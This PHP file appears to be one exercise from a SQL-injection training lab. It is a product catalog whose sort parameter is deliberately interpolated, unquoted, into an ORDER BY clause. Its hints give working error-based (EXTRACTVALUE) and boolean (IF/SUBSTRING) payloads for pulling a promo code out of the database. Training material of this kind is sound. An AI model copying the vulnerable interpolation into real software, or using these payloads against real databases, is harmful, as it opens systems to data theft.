<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    $res = mysqli_query(
        $conn,
        "SELECT code FROM promo_codes LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['code']) {
        $_SESSION['mysql_lab15_solved'] = true;
        header("Location: " . url_lab_from_slug("mysql/lab15", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 15. ORDER BY / GROUP BY Injection</h3>

    <h4>Scenario</h4>
    <p>
        A product catalog displays items with sortable columns. Users click column headers
        (or supply a <code>sort</code> parameter) to change the sort order. The sort column
        is <strong>directly interpolated</strong> into the <code>ORDER BY</code> clause
        without quotes or validation.
    </p>
    <p>
        You <strong>cannot</strong> use <code>UNION SELECT</code> after <code>ORDER BY</code>
       : it causes a syntax error. Instead, use error-based or conditional (boolean)
        techniques within the <code>ORDER BY</code> context.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the <strong>code</strong> from the <code>promo_codes</code> table by
        exploiting the ORDER BY injection. Submit the promo code below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Normal: <code>?sort=price</code> sorts by price. <code>?sort=name</code> sorts by name.<br>
        2. Confirm injection: <code>?sort=1</code> works (column index). <code>?sort=999</code> errors.<br>
        3. UNION won&rsquo;t work: <code>?sort=price UNION SELECT 1,2,3,4,5 -- -</code> -- syntax error.<br>
        4. Error-based: <code>?sort=(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT code FROM promo_codes LIMIT 1))))</code><br>
        5. The XPATH error will contain the promo code prefixed with <code>~</code>.<br>
        6. Conditional: <code>?sort=IF(SUBSTRING((SELECT code FROM promo_codes LIMIT 1),1,1)='F', price, name)</code> -- different sort order reveals true/false.
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
<input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mysql_lab15_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the promo code through SQL injection in an ORDER BY clause.</div>
    </div>
</div>

<?php else: ?>

<!-- Sort Controls -->
<div class="card">
    <h4>Product Catalog</h4>
    <p style="margin-bottom:10px;">
        Sort by:
        <a href="?lab=mysql/lab15&mode=<?= htmlspecialchars($mode) ?>&sort=name" class="btn btn-primary" style="padding:4px 12px; font-size:0.85em; text-decoration:none;">Name</a>
        <a href="?lab=mysql/lab15&mode=<?= htmlspecialchars($mode) ?>&sort=price" class="btn btn-primary" style="padding:4px 12px; font-size:0.85em; text-decoration:none;">Price</a>
        <a href="?lab=mysql/lab15&mode=<?= htmlspecialchars($mode) ?>&sort=category" class="btn btn-primary" style="padding:4px 12px; font-size:0.85em; text-decoration:none;">Category</a>
        <a href="?lab=mysql/lab15&mode=<?= htmlspecialchars($mode) ?>&sort=rating" class="btn btn-primary" style="padding:4px 12px; font-size:0.85em; text-decoration:none;">Rating</a>
    </p>
    <form method="POST" class="form-row">
<input type="text" name="sort" class="input" placeholder="Sort column (try: price)" value="<?= htmlspecialchars($_POST['sort'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Sort</button>
    </form>
</div>

<?php
$sort = $_POST['sort'] ?? 'id';

// INTENTIONALLY VULNERABLE: direct interpolation in ORDER BY (not quoted)
$query = "SELECT id, name, price, category, rating FROM products ORDER BY $sort";

// Show the executed query in a terminal block
echo '<div class="terminal query-output">';
echo '  <div class="terminal-header">';
echo '    <span class="terminal-dot red"></span>';
echo '    <span class="terminal-dot yellow"></span>';
echo '    <span class="terminal-dot green"></span>';
echo '    <span class="terminal-title">MySQL Query</span>';
echo '  </div>';
echo '  <div class="terminal-body" data-highlight="sql">';
echo '    <span class="prompt">mysql&gt; </span>' . htmlspecialchars($query);
echo '  </div>';
echo '</div>';

// Execute the query
mysqli_report(MYSQLI_REPORT_OFF);
$result = @mysqli_query($conn, $query);

if ($result && mysqli_num_rows($result) > 0) {
    echo '<div class="result-data result-box">';
    echo '<table style="width:100%; border-collapse:collapse;">';
    echo '<tr>';
    echo '<th style="text-align:left; padding:6px; border-bottom:1px solid #444;">ID</th>';
    echo '<th style="text-align:left; padding:6px; border-bottom:1px solid #444;">Name</th>';
    echo '<th style="text-align:right; padding:6px; border-bottom:1px solid #444;">Price</th>';
    echo '<th style="text-align:left; padding:6px; border-bottom:1px solid #444;">Category</th>';
    echo '<th style="text-align:right; padding:6px; border-bottom:1px solid #444;">Rating</th>';
    echo '</tr>';
    while ($row = mysqli_fetch_assoc($result)) {
        echo '<tr>';
        echo '<td style="padding:6px; border-bottom:1px solid #333;">' . htmlspecialchars($row['id'] ?? '') . '</td>';
        echo '<td style="padding:6px; border-bottom:1px solid #333;">' . htmlspecialchars($row['name'] ?? '') . '</td>';
        echo '<td style="padding:6px; border-bottom:1px solid #333; text-align:right;">$' . htmlspecialchars($row['price'] ?? '') . '</td>';
        echo '<td style="padding:6px; border-bottom:1px solid #333;">' . htmlspecialchars($row['category'] ?? '') . '</td>';
        echo '<td style="padding:6px; border-bottom:1px solid #333; text-align:right;">' . htmlspecialchars($row['rating'] ?? '') . '</td>';
        echo '</tr>';
    }
    echo '</table>';
    echo '</div>';
} elseif (mysqli_error($conn)) {
    echo '<div class="result-error result-box"><strong>MySQL Error:</strong> ' . htmlspecialchars(mysqli_error($conn)) . '</div>';
} else {
    echo '<div class="result-warning result-box">No products found.</div>';
}

mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
?>

<?php endif; ?>
